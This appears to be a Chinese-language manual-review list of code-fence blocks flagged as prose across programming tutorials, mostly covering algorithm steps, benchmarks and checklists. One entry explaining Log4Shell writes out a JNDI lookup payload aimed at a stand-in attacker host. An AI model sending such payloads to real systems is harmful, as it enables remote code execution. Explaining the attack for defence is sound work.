# 范围内 FENCE_PROSE 人工复核清单


## [UNWRAP] 007-javascript/002-JavaScriptOverviewRuntimeEnv.md:2509 lang=
原因: 散文特征 4.8 codeRatio 0.00
上下文前文:

### Node.js 事件循环（libuv）

块内容(8行):
```
1. timers 阶段：执行 setTimeout/setInterval 到期的回调
2. pending callbacks：执行系统级回调（如 TCP 错误）
3. idle, prepare：内部使用
4. poll：检索新的 I/O 事件
5. check：执行 setImmediate 回调
6. close callbacks：执行 close 事件回调

每个阶段之间清空微任务队列（Next Ticks + Microtasks）
```

## [REVIEW] 007-javascript/016-RecursionTailCallOptimization.md:2344 lang=
原因: prose 1.8 code 0.00
上下文前文:

### E.1 非尾递归的栈

块内容(11行):
```
fact(4) 调用时:
[fact(4): n=4, ret=乘 4]
  [fact(3): n=3, ret=乘 3]
    [fact(2): n=2, ret=乘 2]
      [fact(1): n=1, ret=返回 1]  ← 触发基线

返回时(逐层弹出):
[fact(1)] → 返回 1
[fact(2)] → 2 * 1 = 2,返回 2
[fact(3)] → 3 * 2 = 6,返回 6
[fact(4)] → 4 * 6 = 24,返回 24
```

## [UNWRAP] 007-javascript/027-PromiseStaticMethod.md:291 lang=
原因: 散文特征 4.0 codeRatio 0.00
上下文前文:

证明：二者均构造一个 pending Promise 并暴露其 `resolve` / `reject`。`withResolvers` 的规范实现（ECMA-262 §27.2.4.5）：

块内容(8行):
```
1. Let C be the this value.
2. Let x be ? PromiseResolve(C, undefined).
3. Let promiseCapability be ? NewPromiseCapability(C).
4. Let result be OrdinaryObjectCreate(%Object.prototype%).
5. Perform ! CreateDataPropertyOrThrow(result, "promise", promiseCapability.[[Promise]]).
6. Perform ! CreateDataPropertyOrThrow(result, "resolve", promiseCapability.[[Resolve]]).
7. Perform ! CreateDataPropertyOrThrow(result, "reject", promiseCapability.[[Reject]]).
8. Return result.
```

## [UNWRAP] 007-javascript/032-CoroutinesInJavaScript.md:2121 lang=
原因: 散文特征 6.5 codeRatio 0.11
上下文前文:

`GeneratorResume(generator, value, brand)` 的核心步骤(简化):

块内容(9行):
```
1. 验证 generator 的内部状态为 suspendedYield 或 suspendedStart
2. 将状态置为 executing
3. 恢复执行上下文(generatorContext)
4. 将 value 作为上一个 yield 的结果
5. 执行到下一个 yield、return 或异常
6. 根据结果构造 IteratorResult
7. 将状态置为 suspendedYield 或 completed
8. 切换回调用者的执行上下文
9. 返回 IteratorResult
```

## [REVIEW] 007-javascript/061-RegexAssertions.md:205 lang=
原因: prose 4.0 code 0.36
上下文前文:

实现上，断言通常通过"子匹配 + 位置回退"实现：

块内容(11行):
```
NFA for (?=R):
  1. Save current position p
  2. Run NFA for R starting at p
  3. If accepted, restore position to p (zero-width)
  4. If rejected, fail

NFA for (?<=R):
  1. Save current position p
  2. Find all positions q < p such that w[q:p] ∈ L(R)
  3. If any q exists, continue at p (zero-width)
  4. If none, fail
```

## [REVIEW] 007-javascript/062-JavaScriptTheory.md:1744 lang=
原因: prose 2.4 code 0.09
上下文前文:

V8（自 v11+）采用四层执行模型：

块内容(23行):
```
JavaScript 源代码
      |
      v
  Parser (解析器)
      |
      v
  AST (抽象语法树)
      |
      +---> Ignition (解释器) ---> 字节码执行
      |          |                    |
      |          |                    v (热点代码)
      |          |          Sparkplug (基线编译器) ---> 半优化机器码
      |          |                    |
      |          |                    v (进一步热点)
      |          |          Maglev (中层编译器) ---> 较优化机器码
      |          |                    |
      |          |                    v (持续热点)
      |          |          TurboFan (优化编译器) ---> 高度优化机器码
      |          |                    |
      |          |                    v (逆优化)
      |          +<-------------------+
      |
      +---> 懒解析 (Lazy Parsing)
```

## [REVIEW] 008-typescript/055-TypeScriptCompilePerformanceOptimization.md:699 lang=
原因: prose 2.0 code 0.00
上下文前文:

#### 4.6.2 解读诊断输出

块内容(15行):
```
Files:                          100    # 文件数
Lines:                       10,000    # 代码行数
Nodes:                       50,000    # AST 节点数
Identifiers:                 20,000    # 标识符数
Symbols:                     30,000    # 符号数
Types:                       40,000    # 类型数（过高意味着类型复杂）
Instantiations:             100,000    # 类型实例化数（关键指标）
Memory used:               200,000K    # 内存使用
I/O read:                  10,000ms    # 文件读取
Parse time:                  1,000ms    # 解析时间
Bind time:                     500ms    # 符号绑定
Check time:                  3,000ms    # 类型检查（主要瓶颈）
transformTime:                 500ms    # 转换时间
Print time:                    300ms    # 代码生成
Total time:                  5,600ms    # 总时间
```

## [REVIEW] 008-typescript/060-TsconfigStrictMode.md:34 lang=
原因: prose 2.0 code 0.00
上下文前文:

### 1.3 版本演进时间线

块内容(13行):
```
2014-10  TS 1.0     最初发布，类型检查宽松
2015-07  TS 1.5     noImplicitAny 引入
2016-09  TS 2.0     strictNullChecks 引入（重大突破）
2017-04  TS 2.3     strict 总开关引入，聚合 6 个子选项
2017-08  TS 2.6     strictFunctionTypes 引入（独立选项）
2018-03  TS 2.8     strictBindCallApply 引入
2018-07  TS 3.0     unknown 类型引入，配合 strictNullChecks
2019-08  TS 3.5     strictPropertyInitialization 引入
2020-08  TS 4.0     noImplicitAny 在 catch 子句的改进
2021-04  TS 4.3     useUnknownInCatchVariables 引入
2022-11  TS 4.9     satisfies 操作符，配合严格模式提升精度
2024-03  TS 5.4     NoInfer<T>，严格模式下的类型推断改进
2024-11  TS 5.6     严格模式下迭代器与 Promise 的细化检查
```

## [UNWRAP] 009-vue3/030-VueRouterNavigationGuard.md:454 lang=
原因: 散文特征 5.0 codeRatio 0.00
上下文前文:

### 3. 守卫执行顺序

块内容(6行):
```
1. beforeRouteLeave（离开组件）
2. beforeEach（全局）
3. beforeRouteUpdate（复用组件）
4. beforeEnter（路由配置）
5. beforeRouteEnter（进入组件）
6. afterEach（全局）
```

## [REVIEW] 010-react/012-FiberArchitecture.md:23 lang=
原因: prose 1.7 code 0.14
上下文前文:

每个 React 元素对应一个 Fiber 节点，Fiber 节点通过链表结构组织：

块内容(14行):
```
Fiber 节点结构：
{
  type,        // 组件类型（函数/类/标签名）
  key,         // 列表中的唯一标识
  props,       // 属性对象
  stateNode,   // 关联的实例或 DOM 节点
  return,      // 父 Fiber 节点
  child,       // 第一个子 Fiber 节点
  sibling,     // 下一个兄弟 Fiber 节点
  alternate,   // 双缓冲对应的 Fiber 节点
  effectTag,   // 副作用标记（插入/更新/删除）
  flags,       // 副作用标志位
  lanes,       // 优先级车道
}
```

## [UNWRAP] 010-react/039-ReactCompilerAutoMemoization.md:219 lang=
原因: 散文特征 5.6 codeRatio 0.00
上下文前文:

React Compiler 的完整编译流程：

块内容(17行):
```
1. 源代码（TypeScript/JSX）
   ↓
2. Babel/SWC 解析为 AST
   ↓
3. 语义分析（类型推导、作用域分析）
   ↓
4. 纯函数检查（Rules of React 验证）
   ↓
5. 依赖图构建
   ↓
6. 记忆化策略决策
   ↓
7. 代码生成（插入 useMemoCache）
   ↓
8. Source Map 生成
   ↓
9. 输出优化后的代码
```

## [UNWRAP] 010-react/040-ServerClientComponents.md:168 lang=
原因: 散文特征 4.1 codeRatio 0.00
上下文前文:

RSC 的完整渲染流程分为六个阶段：

块内容(11行):
```
1. 请求到达服务端
   ↓
2. 服务端渲染 Server Components（可中断、可并行）
   ↓
3. 序列化为 RSC Payload（流式 JSON）
   ↓
4. 流式传输到客户端（HTTP streaming）
   ↓
5. 客户端 React 解析 RSC Payload，渲染 Client Components
   ↓
6. Hydration 完成，页面可交互
```

## [REVIEW] 012-java/037-JavaAnnotationsTutorial.md:1110 lang=
原因: prose 2.0 code 0.00
上下文前文:

**修复**：

块内容(4行):
```
# 文件路径：src/main/resources/META-INF/services/javax.annotation.processing.Processor
# 内容：
com.example.ImmutableProcessor
com.example.BuilderProcessor
```

## [REVIEW] 012-java/037-JavaAnnotationsTutorial.md:1654 lang=
原因: prose 2.0 code 0.00
上下文前文:

**3.** 通过 SPI 注册注解处理器：

块内容(3行):
```
# 创建文件 src/main/resources/META-INF/services/javax.annotation.processing.Processor
# 内容：
com.example.MyProcessor
```

## [REVIEW] 012-java/080-SpringBasicsIoCAOPBeanLifecycle.md:557 lang=
原因: prose 2.0 code 0.00
上下文前文:

#### 3.6.2 请求处理流程

块内容(10行):
```
请求 → DispatcherServlet
    → HandlerMapping.resolve(request)  // 找到 HandlerExecutionChain
    → HandlerInterceptor.preHandle()   // 前置拦截
    → HandlerAdapter.handle(request, response, handler)  // 执行 Controller
        → Controller 方法执行
        → 返回 ModelAndView 或对象（@ResponseBody）
    → HandlerInterceptor.postHandle()  // 后置拦截
    → ViewResolver / MessageConverter  // 渲染视图或序列化 JSON
    → HandlerInterceptor.afterCompletion()  // 完成回调
    → 响应
```

## [REVIEW] 012-java/088-JavaLogSystem.md:1690 lang=
原因: prose 5.5 code 0.29
上下文前文:

#### 8.5.2 攻击链路

块内容(7行):
```
1. 攻击者发送 HTTP 请求，User-Agent: ${jndi:ldap://attacker.com/Exploit}
2. 应用记录日志：logger.info("User-Agent: {}", userAgent)
3. Log4j 2 解析 ${jndi:...}，调用 JndiLookup.lookup()
4. JndiLookup 通过 LDAP 连接 attacker.com
5. attacker.com 返回一个 RMI 引用，指向恶意类的 Codebase
6. 应用从 Codebase 下载并执行恶意类
7. 攻击者获得 RCE 权限
```

## [REVIEW] 012-java/093-JavaSecurity.md:102 lang=
原因: prose 2.0 code 0.00
上下文前文:

TLS 1.3 1-RTT 握手：

块内容(11行):
```
Client                                          Server
  | --- ClientHello (key_share, supported_groups) ---> |
  |                                                    |
  | <-- ServerHello (key_share) ---------------------- |
  | <-- EncryptedExtensions -------------------------- |
  | <-- Certificate ---------------------------------- |
  | <-- CertificateVerify ---------------------------- |
  | <-- Finished ------------------------------------- |
  |                                                    |
  | --- Finished ------------------------------------> |
  | --- Application Data <---------------------------> |
```

## [REVIEW] 012-java/095-JavaDocker.md:1012 lang=
原因: prose 1.0 code 0.00
上下文前文:

**正确做法**：

块内容(3行):
```
-XX:+ExitOnOutOfMemoryError
# 或更激进的
-XX:+CrashOnOutOfMemoryError
```

## [REVIEW] 013-kotlin/014-NullSafetyDetailed.md:138 lang=
原因: prose 2.0 code 0.00
上下文前文:

### 1.11 时间线总览

块内容(12行):
```
1965  ALGOL W — Tony Hoare 引入空引用（"十亿美元的错误"）
1973  ML — 引入 option 类型，函数式空安全开端
1990  Haskell — Maybe monad，类型系统化空安全
2004  Scala — Option[T]，函数式容器
2014  Swift — Optional<T>，语法糖 T?
2016  Kotlin 1.0 — 空安全初版，T?/?. /?:/!!/as?
2017  Kotlin 1.1 — 实验性契约 API
2018  Kotlin 1.3 — 契约稳定，KMP 一致性
2020  Kotlin 1.4 — @Nullable 注解标准化
2022  Kotlin 1.7 — K2 预览，智能转换优化
2023  Kotlin 1.9 — JSpecify 集成
2024  Kotlin 2.0 — K2 GA，跨模块空安全检查
```

## [UNWRAP] 013-kotlin/014-NullSafetyDetailed.md:2239 lang=markdown
原因: 散文特征 9.6 codeRatio 0.06
上下文前文:

#### 7.1.3 团队约定

块内容(16行):
```
# 空安全团队规范

## 必须
- 公共 API 必须明确标注可空性
- 使用 `?.` 与 `?:` 处理可空值
- `lateinit` 仅用于确定会初始化的属性

## 禁止
- 禁止在业务代码中使用 `!!`（测试代码除外）
- 禁止将平台类型直接赋值给不可空类型
- 禁止在公共 API 中返回 `Result<T>`

## 推荐
- 使用 `sealed class` 表示"可能失败"的结果
- 使用 `requireNotNull` / `checkNotNull` 做前置条件检查
- 使用 `safeLet` 处理多个可空值的同时非空
```

## [UNWRAP] 013-kotlin/050-InlineClass.md:2159 lang=
原因: 散文特征 6.3 codeRatio 0.00
上下文前文:

### A.2 装箱场景速查

块内容(12行):
```
装箱场景：
1. V?（可空类型）
2. T 是 V（泛型类型参数）
3. List<V>、Set<V>、Map<K, V>（集合）
4. Array<V>（数组）
5. Any（基础类型转换）

非装箱场景：
1. 直接传递 V
2. V 的方法调用
3. V 的属性访问
4. inline 函数中的 V（reified）
```

## [REVIEW] 013-kotlin/050-InlineClass.md:2176 lang=
原因: prose 5.0 code 0.17
上下文前文:

### A.3 约束速查

块内容(6行):
```
1. 单一属性（val，不能是 var）
2. 不能继承其他类
3. 不能是 abstract、open、sealed
4. 不能有 backing field
5. 不能递归引用
6. JVM 平台必须 @JvmInline
```

## [UNWRAP] 014-csharp/012-CSharpTestEngineering.md:1706 lang=
原因: 散文特征 5.7 codeRatio 0.00
上下文前文:

**测试金字塔实施**：

块内容(13行):
```
单元测试（70%）：
- 业务规则验证（价格计算、库存检查）
- 数据模型验证
- 工具类测试

集成测试（20%）：
- API 端到端测试
- 数据库持久化测试
- 第三方支付接口测试（使用 WireMock）

E2E 测试（10%）：
- 关键用户流程（注册→下单→支付→收货）
- 多角色权限测试
```

## [REVIEW] 014-csharp/012-CSharpTestEngineering.md:2188 lang=
原因: prose 2.0 code 0.08
上下文前文:

**附录 D：性能基准测试结果示例**

块内容(13行):
```
BenchmarkDotNet=v0.13.12, OS=Windows 11
Intel Core i7-12700H CPU 2.30GHz, 1 CPU, 20 logical and 14 physical cores
.NET SDK=8.0.100
  [Host]     : .NET 8.0.0, X64 RyuJIT AVX2
  DefaultJob : .NET 8.0.0, X64 RyuJIT AVX2

| Method                | Mean      | Error     | StdDev    | Median    | Rank | Gen0   | Allocated |
|---------------------- |----------:|----------:|----------:|----------:|-----:|-------:|----------:|
| StringConcatenation   | 25.342 us | 0.4821 us | 0.7012 us | 25.234 us |    3 | 8.7280 |  44000 B  |
| StringBuilder         |  2.154 us | 0.0421 us | 0.0587 us |  2.146 us |    2 | 0.6180 |   3200 B  |
| StringJoin            |  1.876 us | 0.0312 us | 0.0462 us |  1.864 us |    1 | 0.6180 |   3200 B  |
| StringConcat          |  1.891 us | 0.0358 us | 0.0492 us |  1.882 us |    1 | 0.6180 |   3200 B  |
| LinqAggregate         | 24.872 us | 0.4932 us | 0.7218 us | 24.768 us |    3 | 8.7280 |  44000 B  |
```

## [REVIEW] 014-csharp/013-CSharpGameDevUnity.md:43 lang=
原因: prose 1.4 code 0.05
上下文前文:

### 2.1 生命周期流程

块内容(20行):
```
初始化阶段:
  Awake()       → 脚本实例加载时调用（最早）
  OnEnable()    → 对象启用时调用
  Start()       → 第一帧更新前调用（仅一次）

物理阶段:
  FixedUpdate() → 固定时间间隔调用（物理计算）

输入阶段:
  Update()      → 每帧调用

后期处理:
  LateUpdate()  → 每帧在所有 Update 之后调用

场景渲染:
  OnPreCull()   → OnPreRender() → OnPostRender()

禁用与销毁:
  OnDisable()   → 对象禁用时调用
  OnDestroy()   → 对象销毁时调用
```

## [REVIEW] 014-csharp/013-CSharpGameDevUnity.md:320 lang=
原因: prose 0.8 code 0.03
上下文前文:

### 5.1 传统 MonoBehaviour vs ECS

块内容(29行):
```
MonoBehaviour (OOP):
  GameObject → MonoBehaviour组件 → Update() 轮询
  问题：大量对象时性能差、GC 压力大、缓存不友好

ECS (Entity Component System):
  Entity   → 纯 ID，无数据无行为
  Component→ 纯数据，struct，连续内存
  System   → 纯逻辑，批量处理 Component
  优势：数据局部性、批量处理、无 GC、并行友好
```mermaid
flowchart LR
    subgraph DOTS[Unity DOTS]
        E[Entities<br/>ECS 框架]
        B[Burst Compiler<br/>SIMD 编译器]
        J[C# Job System]
        C[Collections<br/>NativeArray 等]
    end
    E --- B
    J --- C
```mermaid
flowchart LR
    subgraph DOTS[Unity DOTS]
        E[Entities<br/>ECS 框架]
        B[Burst Compiler<br/>SIMD 编译器]
        J[C# Job System]
        C[Collections<br/>NativeArray 等]
    end
    E --- B
    J --- C
```

## [UNWRAP] 014-csharp/019-SpanMemory.md:3308 lang=text
原因: 散文特征 4.0 codeRatio 0.00
上下文前文:

### D.4 PerfView

块内容(7行):
```
# 捕获 GC 事件
PerfView.exe /OnlyProviders=*Microsoft-Windows-DotNETRuntime:0x1:4 collect

# 分析停顿时间
PerfView.exe trace.etl
# 查看 GC Stats 视图
# 查看 GC Heap Alloc Ignore Free 视图
```

## [UNWRAP] 014-csharp/022-CSharpBlazor.md:2625 lang=
原因: 散文特征 9.2 codeRatio 0.00
上下文前文:

**附录 G：开发环境配置清单**

块内容(25行):
```
必要工具：
- .NET 8 SDK 或更高版本
- Visual Studio 2022 17.8+ 或 Visual Studio Code + C# Dev Kit
- Node.js 18+（用于前端工具链，可选）
- Git

推荐插件（VS Code）：
- C# Dev Kit
- Blazor Snippets
- Razor+ (语法高亮增强)

推荐扩展（Visual Studio）：
- Web Essentials
- Blazorator
- Live Blazor Preview

浏览器扩展：
- C# DevTools（Chrome/Edge，调试 WASM）
- Blazor Inspector（DOM 检查增强）

命令行工具：
- dotnet-ef（EF Core 工具）
- dotnet-watch（热重载）
- dotnet-counters（性能监控）
- dotnet-dump（内存分析）
```

## [UNWRAP] 014-csharp/022-CSharpBlazor.md:2691 lang=
原因: 散文特征 12.9 codeRatio 0.00
上下文前文:

**附录 I：部署清单**

块内容(27行):
```
Blazor Server 部署：
- [ ] 配置反向代理（Nginx/IIS）
- [ ] 启用 WebSocket 支持
- [ ] 配置 SignalR 背板（Redis）
- [ ] 设置连接超时与重连策略
- [ ] 配置健康检查
- [ ] 启用压缩（gzip/br）
- [ ] 配置 HTTPS
- [ ] 设置日志收集

Blazor WebAssembly 部署：
- [ ] 配置静态文件服务
- [ ] 启用 Brotli/Gzip 压缩
- [ ] 配置缓存策略
- [ ] 启用 PWA（如需离线）
- [ ] 配置 CORS（如调用外部 API）
- [ ] 部署到 CDN
- [ ] 配置 HTTPS
- [ ] 启用 HSTS

通用：
- [ ] 配置环境变量
- [ ] 设置连接字符串
- [ ] 配置密钥管理
- [ ] 启用 Application Insights（监控）
- [ ] 配置备份策略
- [ ] 制定回滚方案
```

## [REVIEW] 014-csharp/022-CSharpBlazor.md:2750 lang=
原因: prose 1.8 code 0.00
上下文前文:

**附录 L：性能优化检查表**

块内容(29行):
```
首屏优化：
[ ] 启用预渲染（Server 模式）
[ ] 使用 AOT 编译（WASM 模式）
[ ] 启用裁剪
[ ] 懒加载大型程序集
[ ] 压缩静态资源
[ ] 使用 CDN

运行时优化：
[ ] 使用 @key 优化列表渲染
[ ] 虚拟化大数据列表
[ ] 避免 Update 中的内存分配
[ ] 缓存组件引用
[ ] 使用 ValueTask 替代 Task
[ ] 减少不必要的 StateHasChanged 调用

内存优化：
[ ] 取消事件订阅
[ ] 释放 JS 对象引用
[ ] 释放 Timer 与 IDisposable 资源
[ ] 避免闭包捕获大对象
[ ] 使用对象池

网络优化：
[ ] 启用 SignalR 压缩
[ ] 配置合理的传输方式
[ ] 使用 MessagePack 替代 JSON
[ ] 减小 API 响应体积
[ ] 启用 HTTP/2 或 HTTP/3
```

## [REVIEW] 014-csharp/022-CSharpBlazor.md:2784 lang=
原因: prose 1.8 code 0.00
上下文前文:

**附录 M：安全检查清单**

块内容(25行):
```
认证与授权：
[ ] 使用 HTTPS
[ ] 配置认证中间件
[ ] 实现 Role-based 与 Policy-based 授权
[ ] 验证所有敏感操作
[ ] 实现防 CSRF

输入验证：
[ ] 所有用户输入进行验证
[ ] 使用 DataAnnotations
[ ] 防止 XSS（Blazor 自动转义）
[ ] 防止 SQL 注入（使用参数化查询）
[ ] 限制上传文件大小与类型

JS 互操作安全：
[ ] 不在 JS 中执行用户输入
[ ] 验证从 JS 接收的数据
[ ] 限制 JS 调用范围
[ ] 使用 ES 模块隔离

WASM 安全：
[ ] 不在客户端存储敏感数据
[ ] 验证所有客户端计算结果
[ ] 使用 Service Worker 缓存敏感数据时谨慎
[ ] 注意 WASM 代码可被反编译
```

## [REVIEW] 014-csharp/030-AsyncAwaitStateMachine.md:258 lang=
原因: prose 8.3 code 0.29
上下文前文:

编译器对 `async` 方法的转换遵循以下算法（简化版）：

块内容(17行):
```
输入：async 方法 M，包含 await 点 a_1, a_2, ..., a_n
输出：状态机结构体 StateMachine_M，builder 方法 Builder_M

1. 创建结构体 StateMachine_M : IAsyncStateMachine
   - 字段：
     * int <>1__state: 当前状态，初始 0（或 -1 表示已启动）
     * TBuilder <>t__builder: AsyncMethodBuilder 实例
     * TAwaiter <>u__1, <>u__2, ...: 每个 await 的 awaiter
     * 局部变量提升为字段
   - 方法：
     * void MoveNext(): 状态转移逻辑
     * void SetStateMachine(IAsyncStateMachine): 装箱回调

2. 在原方法 M 中：
   - 创建 StateMachine_M 实例（栈分配）
   - 调用 <>t__builder.Start(ref stateMachine)
   - 返回 <>t__builder.Task
```

## [UNWRAP] 014-csharp/031-DelegateEventUnderlying.md:519 lang=
原因: 散文特征 6.4 codeRatio 0.06
上下文前文:

`Delegate.Combine(a, b)` 的伪代码：

块内容(16行):
```
Algorithm: Combine(a, b)
Input: 委托 a, b
Output: 合并后的委托

1. IF a == null THEN RETURN b
2. IF b == null THEN RETURN a
3. IF Type(a) != Type(b) THEN
4.   THROW ArgumentException
5. END IF
6. list_a <- GetInvocationList(a)  // 若 _invocationList == null 则返回 [a]
7. list_b <- GetInvocationList(b)
8. result <- new Delegate[list_a.Length + list_b.Length]
9. Array.Copy(list_a, result, 0)
10. Array.Copy(list_b, result, list_a.Length)
11. newDelegate <- a.NewWithInvocationList(result)
12. RETURN newDelegate
```

## [UNWRAP] 014-csharp/031-DelegateEventUnderlying.md:544 lang=
原因: 散文特征 6.9 codeRatio 0.06
上下文前文:

`Delegate.Remove(source, value)` 从 `source` 中移除**最后一个**与 `value` 等价的委托：

块内容(17行):
```
Algorithm: Remove(source, value)
Input: 多播委托 source, 待移除委托 value
Output: 移除后的委托

1. IF source == null OR value == null THEN RETURN source
2. list <- GetInvocationList(source)
3. FOR i FROM list.Length - 1 DOWN TO 0 DO:
4.   IF list[i].Equals(value) THEN:
5.     IF list.Length == 1 THEN RETURN null
6.     IF list.Length == 2 THEN RETURN (i == 0 ? list[1] : list[0])
7.     newList <- new Delegate[list.Length - 1]
8.     Array.Copy(list, 0, newList, 0, i)
9.     Array.Copy(list, i + 1, newList, i, list.Length - i - 1)
10.    RETURN source.NewWithInvocationList(newList)
11.  END IF
12. END FOR
13. RETURN source  // 未找到匹配
```

## [REVIEW] 014-csharp/031-DelegateEventUnderlying.md:842 lang=
原因: prose 2.0 code 0.00
上下文前文:

实测对比（.NET 8, x64）：

块内容(9行):
```
BenchmarkDotNet v0.13.12
| Method            | Mean      | Ratio |
|------------------ |----------:|------:|
| DirectCall        |  1.21 ns  |  1.00 |
| DelegateCall      |  3.18 ns  |  2.63 |
| MulticastCall(1)  |  3.25 ns  |  2.69 |
| MulticastCall(5)  | 16.42 ns  | 13.57 |
| MethodInfoInvoke  |245.78 ns  |203.12 |
| DelegateCreateDelegate | 4.02 ns | 3.32 |
```

## [REVIEW] 014-csharp/031-DelegateEventUnderlying.md:2680 lang=
原因: prose 2.0 code 0.13
上下文前文:

## 附录 B：委托性能基准（.NET 8, x64）

块内容(24行):
```
BenchmarkDotNet v0.13.12
Runtime=.NET 8.0
Platform=Windows 11
Processor=Intel Core i7-12700K

| Method                  | Mean      | Error     | StdDev    | Ratio | Allocated |
|------------------------ |----------:|----------:|----------:|------:|----------:|
| DirectCall              |  1.21 ns  | 0.02 ns   | 0.02 ns   |  1.00 |         - |
| DelegateCall            |  3.18 ns  | 0.05 ns   | 0.06 ns   |  2.63 |         - |
| MulticastDelegate_1     |  3.25 ns  | 0.04 ns   | 0.05 ns   |  2.69 |         - |
| MulticastDelegate_5     | 16.42 ns  | 0.18 ns   | 0.21 ns   | 13.57 |         - |
| MulticastDelegate_10    | 32.80 ns  | 0.34 ns   | 0.32 ns   | 27.11 |         - |
| MulticastDelegate_100   | 328.50 ns | 4.21 ns   | 3.94 ns   |271.49 |         - |
| MethodInfoInvoke        |245.78 ns  | 2.45 ns   | 2.29 ns   |203.12 |         - |
| CreateDelegate_ThenCall |  4.02 ns  | 0.06 ns   | 0.05 ns   |  3.32 |         - |
| ExpressionTree          |  4.12 ns  | 0.07 ns   | 0.08 ns   |  3.41 |         - |
| DynamicMethod           |  4.50 ns  | 0.08 ns   | 0.07 ns   |  3.72 |         - |
| DynamicCallSite         | 18.34 ns  | 0.25 ns   | 0.22 ns   | 14.91 |         - |
| FuncPtr (delegate*)     |  1.45 ns  | 0.03 ns   | 0.03 ns   |  1.20 |         - |
| VirtualMethodCall       |  2.10 ns  | 0.04 ns   | 0.04 ns   |  1.74 |         - |
| InterfaceMethodCall     |  2.15 ns  | 0.05 ns   | 0.04 ns   |  1.78 |         - |
| ClosureCaptureLocal     |  5.25 ns  | 0.08 ns   | 0.09 ns   |  4.34 |         - |
| ClosureCaptureThis      |  4.80 ns  | 0.07 ns   | 0.06 ns   |  3.97 |         - |
| StaticLambda            |  3.20 ns  | 0.05 ns   | 0.04 ns   |  2.64 |         - |
```

## [REVIEW] 014-csharp/032-ReflectionAndFeatureApplication.md:318 lang=
原因: prose 2.0 code 0.00
上下文前文:

实测对比：

块内容(9行):
```
BenchmarkDotNet v0.13.12, .NET 8
| Method          | Mean      | Ratio |
|---------------- |----------:|------:|
| DirectCall      |  1.23 ns  |  1.00 |
| DelegateCall    |  3.45 ns  |  2.80 |
| ExpressionTree  |  4.12 ns  |  3.35 |
| DynamicMethod   |  4.50 ns  |  3.66 |
| MethodInfoInvoke|245.78 ns  |199.82 |
| DynamicCallSite | 18.34 ns  | 14.91 |
```

## [UNWRAP] 014-csharp/032-ReflectionAndFeatureApplication.md:334 lang=
原因: 散文特征 7.3 codeRatio 0.00
上下文前文:

读取目标 $T$ 上特性 $A$ 的算法：

块内容(18行):
```
Algorithm: GetCustomAttributes(T, A)
Input: 目标 T (MemberInfo)，特性类型 A (Type)
Output: 特性实例列表

1. metadataTokens <- MetadataReader.GetCustomAttributes(T.MetadataToken)
2. result <- []
3. FOR each token IN metadataTokens DO:
4.   attrData <- MetadataReader.ReadCustomAttribute(token)
5.   IF attrData.AttributeType.IsAssignableTo(A) THEN:
6.     IF useInstance THEN:
7.       instance <- CustomAttributeBuilder.CreateInstance(attrData)
8.       result.Add(instance)
9.     ELSE:
10.      result.Add(attrData)  // CustomAttributeData 形式
11.    END IF
12.  END IF
13. END FOR
14. RETURN result
```

## [UNWRAP] 014-csharp/033-EFCoreMigrationOptimization.md:307 lang=
原因: 散文特征 4.7 codeRatio 0.00
上下文前文:

查询翻译管线：

块内容(6行):
```
1. LINQ Expression Tree (C# 编译器生成)
2. QueryExpression (EF Core 内部表示)
3. SelectExpression (SQL SELECT 树)
4. ShapedQueryExpression (实体物化器)
5. RelationalCommand (SQL 字符串 + 参数)
6. DbDataReader → Entity Materializer → T
```

## [REVIEW] 014-csharp/033-EFCoreMigrationOptimization.md:472 lang=
原因: prose 5.0 code 0.21
上下文前文:

`SaveChanges` 调用 `DetectChanges`，扫描所有 tracked 实体比较当前值与原始值：

块内容(14行):
```
Algorithm: DetectChanges
Input: ChangeTracker
Output: Updated state for each entity

1. FOR each entity IN ChangeTracker.Entries DO:
2.   IF entity.State == Unchanged THEN:
3.     FOR each property IN entity.Properties DO:
4.       IF !Equals(property.CurrentValue, property.OriginalValue) THEN:
5.         entity.State = Modified
6.         property.IsModified = true
7.       END IF
8.     END FOR
9.   END IF
10. END FOR
```

## [REVIEW] 014-csharp/033-EFCoreMigrationOptimization.md:2540 lang=
原因: prose 2.0 code 0.14
上下文前文:

## 附录 A：EF Core 性能基准（.NET 8, EF Core 8）

块内容(21行):
```
BenchmarkDotNet v0.13.12
Runtime=.NET 8.0
Database=SQL Server 2022
Table=Blogs (10000 rows)

| Method                              | Mean     | Allocated | Ratio |
|------------------------------------ |---------:|----------:|------:|
| FindAsync (tracked)                 | 2.45 ms  |  248 KB   |  1.00 |
| FindAsync (AsNoTracking)            | 1.80 ms  |  124 KB   |  0.73 |
| FirstAsync (tracked)                | 2.60 ms  |  260 KB   |  1.06 |
| FirstAsync (AsNoTracking)           | 1.85 ms  |  128 KB   |  0.76 |
| ToListAsync (1000, tracked)         | 18.50 ms |  2.4 MB   |  7.55 |
| ToListAsync (1000, AsNoTracking)    | 12.30 ms |  1.2 MB   |  5.02 |
| ToListAsync (Projection)            |  8.20 ms |  640 KB   |  3.35 |
| Include (10 blogs × 100 posts)      | 45.20 ms |  6.8 MB   | 18.45 |
| Include + AsSplitQuery              | 28.50 ms |  4.2 MB   | 11.63 |
| ExecuteUpdate (1000 rows)           |  3.20 ms |   24 KB   |  1.31 |
| SaveChanges (1000 inserts)          | 85.00 ms |  8.5 MB   | 34.69 |
| SaveChanges + AutoDetectChanges off | 62.50 ms |  4.2 MB   | 25.51 |
| BulkInsert (EFCore.BulkExtensions)  | 15.20 ms |  1.8 MB   |  6.20 |
| Dapper Query (1000 rows)            |  6.80 ms |  580 KB   |  2.78 |
```

## [REVIEW] 014-csharp/038-RecordTypeImmutability.md:913 lang=
原因: prose 2.0 code 0.00
上下文前文:

#### 5.2.3 性能基准

块内容(6行):
```
BenchmarkDotNet v0.13.12, Windows 11
| Method            | Mean      | Ratio | Allocated |
|------------------ |----------:|------:|----------:|
| CSharpRecordClass |  18.45 ns |  1.00 |      40 B |
| CSharpRecordStruct|   3.21 ns |  0.17 |         - |
| JavaRecord        |  22.10 ns |  1.20 |      48 B |
```

## [REVIEW] 015-go/021-GoroutineSchedule.md:1155 lang=text
原因: prose 1.2 code 0.08
上下文前文:

### 1. Go Module 配置

块内容(12行):
```
# go.mod
module github.com/fandex/server

go 1.22

require (
	github.com/prometheus/client_golang v1.19.0
	go.uber.org/zap v1.27.0
	golang.org/x/sync v0.7.0
)

require go.uber.org/automaxprocs v1.5.3 // 间接依赖自动启用
```

## [REVIEW] 015-go/027-GoDocker.md:898 lang=
原因: prose 1.0 code 0.00
上下文前文:

**解决**：使用 `.dockerignore`：

块内容(14行):
```
# .dockerignore
.git
.github
node_modules
vendor
*.md
*.log
.env
.env.local
.idea
.vscode
dist
build
coverage
```

